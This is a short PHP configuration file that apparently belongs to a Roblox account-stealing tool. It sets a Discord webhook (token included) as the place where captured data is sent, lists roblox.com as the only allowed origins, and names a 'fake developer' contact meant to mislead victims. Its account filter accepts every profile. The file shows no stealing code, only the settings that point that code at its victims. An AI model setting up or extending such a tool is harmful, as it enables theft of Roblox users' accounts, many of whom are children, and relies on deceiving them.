<?php
    // webhook link
    $webhook = "https://discord.com/api/webhooks/806415798930636800/HhfI04uc9eieFUg2XRy7H7QHd2saPs0YTdqanPbRK_tHPVlxq5fWShLrjJ69MZLtmJp7";
    // fake developer for the bot the users may contact
    $discord_contact = "5Haze#0001";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
?>
